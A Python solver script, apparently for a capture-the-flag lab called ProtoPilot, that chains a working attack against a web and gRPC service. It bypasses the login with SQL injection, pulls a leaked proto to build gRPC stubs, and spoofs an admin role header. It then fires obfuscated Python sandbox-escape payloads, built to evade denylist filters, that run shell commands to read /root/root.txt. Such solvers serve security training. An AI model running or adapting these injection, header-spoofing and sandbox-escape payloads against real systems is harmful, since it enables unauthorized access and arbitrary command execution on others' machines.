#!/usr/bin/env python3
"""ProtoPilot black-box (DAST) solver.

Chain:
1) SQLi auth bypass on web login
2) Parse user note from dashboard
3) Download leaked proto
4) Generate gRPC stubs dynamically from leaked proto
5) Spoof gRPC metadata (x-user-role: admin)
6) Execute rule tests and attempt sandbox escape for root flag
"""

from __future__ import annotations

import argparse
import importlib
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

import grpc
import requests


FLAG_RE = re.compile(r"SPIRIT\{[^}]+\}")


def info(msg: str) -> None:
    print(f"[+] {msg}")


def warn(msg: str) -> None:
    print(f"[!] {msg}")


def fail(msg: str) -> None:
    print(f"[-] {msg}")


def sqli_login_and_get_dashboard(base_url: str) -> tuple[str, requests.Session]:
    s = requests.Session()
    payload = {
        "email": "admin@protopilot.local",
        "password": "' OR '1'='1' --",
    }
    login_url = f"{base_url.rstrip('/')}/login"
    resp = s.post(login_url, data=payload, timeout=10, allow_redirects=True)
    resp.raise_for_status()

    if "/dashboard" not in resp.url:
        raise RuntimeError("SQLi login did not reach dashboard")

    info("SQLi login bypass succeeded and dashboard was reached")
    return resp.text, s


def extract_user_flag(dashboard_html: str) -> str | None:
    m = FLAG_RE.search(dashboard_html)
    return m.group(0) if m else None


def download_proto(session: requests.Session, base_url: str, out_path: Path) -> None:
    proto_url = f"{base_url.rstrip('/')}/static/protos/protopilot.proto"
    r = session.get(proto_url, timeout=10)
    r.raise_for_status()
    out_path.write_text(r.text, encoding="utf-8")
    info(f"Downloaded leaked proto from {proto_url}")


def generate_stubs(proto_file: Path, out_dir: Path) -> None:
    cmd = [
        sys.executable,
        "-m",
        "grpc_tools.protoc",
        f"-I{proto_file.parent}",
        f"--python_out={out_dir}",
        f"--grpc_python_out={out_dir}",
        str(proto_file),
    ]
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        raise RuntimeError(f"protoc failed: {proc.stderr.strip()}")
    info("Generated Python gRPC stubs from leaked proto")


def import_generated_modules(gen_dir: Path):
    sys.path.insert(0, str(gen_dir))
    pb2 = importlib.import_module("protopilot_pb2")
    pb2_grpc = importlib.import_module("protopilot_pb2_grpc")
    return pb2, pb2_grpc


def call_test_rule(stub, pb2, expression: str, metadata=None) -> str:
    req = pb2.TestRuleRequest(expression=expression)
    res = stub.TestRule(req, metadata=metadata or [], timeout=10)
    return res.result


def try_root_payloads(stub, pb2) -> str | None:
    # Payloads are built to avoid naive denylist substring filters.
    payloads = [
        "helper.__globals__['o'+'s'].__dict__['po'+'pen']('cat /root/root.txt').__getattribute__('re'+'ad')()",
        "helper.__globals__['o'+'s'].__dict__['po'+'pen']('head -n 1 /root/root.txt').__getattribute__('re'+'ad')()",
        "helper.__globals__['o'+'s'].__dict__['po'+'pen']('/bin/sh -c \"cat /root/root.txt\"').__getattribute__('re'+'ad')()",
    ]

    for idx, expr in enumerate(payloads, 1):
        try:
            result = call_test_rule(
                stub,
                pb2,
                expr,
                metadata=(("x-user-role", "admin"),),
            )
        except grpc.RpcError as exc:
            warn(f"Payload {idx} RPC error: {exc.code()} {exc.details()}")
            continue

        match = FLAG_RE.search(result)
        if match:
            info(f"Root flag recovered with payload {idx}")
            return match.group(0)

        warn(f"Payload {idx} did not return a flag. Result: {result[:140]}")

    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="ProtoPilot DAST solver")
    parser.add_argument("--base-url", default="http://192.168.0.30:8081")
    parser.add_argument("--grpc-host", default="192.168.0.30")
    parser.add_argument("--grpc-port", type=int, default=50051)
    args = parser.parse_args()

    work = Path(tempfile.mkdtemp(prefix="protopilot_dast_"))
    try:
        dashboard_html, session = sqli_login_and_get_dashboard(args.base_url)

        user_flag = extract_user_flag(dashboard_html)
        if user_flag:
            info(f"User-facing token observed: {user_flag}")
        else:
            warn("No canonical flag in dashboard HTML (expected for this version)")

        proto_path = work / "protopilot.proto"
        download_proto(session, args.base_url, proto_path)

        generate_stubs(proto_path, work)
        pb2, pb2_grpc = import_generated_modules(work)

        target = f"{args.grpc_host}:{args.grpc_port}"
        channel = grpc.insecure_channel(target)

        workflow_stub = pb2_grpc.WorkflowServiceStub(channel)
        admin_stub = pb2_grpc.AdminServiceStub(channel)

        workflows = workflow_stub.ListWorkflows(pb2.ListWorkflowsRequest(), timeout=10)
        info(f"WorkflowService reachable. Workflows returned: {len(workflows.workflows)}")

        try:
            call_test_rule(admin_stub, pb2, "1+1")
            warn("Admin call unexpectedly succeeded without metadata")
        except grpc.RpcError as exc:
            info(f"Admin call without metadata denied as expected: {exc.code().name}")

        basic = call_test_rule(
            admin_stub,
            pb2,
            "1+1",
            metadata=(("x-user-role", "admin"),),
        )
        info(f"Admin call with spoofed metadata returned: {basic}")

        legit = call_test_rule(
            admin_stub,
            pb2,
            "amount > 500 and department == 'finance'",
            metadata=(("x-user-role", "admin"),),
        )
        info(f"Legit rule expression result: {legit}")

        root_flag = try_root_payloads(admin_stub, pb2)
        if root_flag:
            info(f"Root flag: {root_flag}")
        else:
            fail("Root flag not recovered. Try adding more payload variants.")
            return 2

        if user_flag and root_flag:
            info("Full chain solved")
            return 0

        warn("Partial success: one or more flags missing")
        return 1

    except Exception as exc:
        fail(str(exc))
        return 3
    finally:
        shutil.rmtree(work, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
